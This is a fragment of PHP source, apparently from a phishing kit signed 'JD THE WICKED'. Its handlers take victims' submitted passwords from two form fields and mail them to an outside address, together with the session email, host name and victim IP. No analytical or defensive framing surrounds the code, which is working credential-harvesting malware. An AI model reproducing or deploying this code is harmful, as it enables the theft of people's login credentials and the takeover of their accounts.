...
function Info($user, $pass)
{
	...
	$message .= ".++----------------------==-[ JD THE WICKED ]---------------------------++.\n";

	return $message;
}
if(isset($_POST['password_awal'])) {
    logger("[PASSWORD] {$_SERVER['REQUEST_URI']} - 200");
    mail($to, "John DOE {$_SERVER['REMOTE_ADDR']}", "Host: | {$_SERVER['HTTP_HOST']} | Email: ".base64_decode($_SESSION['email'])." | Pass: {$_POST['password_awal']} | IP: {$_SERVER['REMOTE_ADDR']}");
    if($backup == 1)
	{
...
if(isset($_POST['password_akhir'])) {
    logger("[PASSWORD] {$_SERVER['REQUEST_URI']} - 200");
    mail($to, "John DOE {$_SERVER['REMOTE_ADDR']}", "Host: | {$_SERVER['HTTP_HOST']} | Email: ".base64_decode($_SESSION['email'])." | Pass: {$_POST['password_akhir']} | IP: {$_SERVER['REMOTE_ADDR']}");
    if($backup == 1)
	{
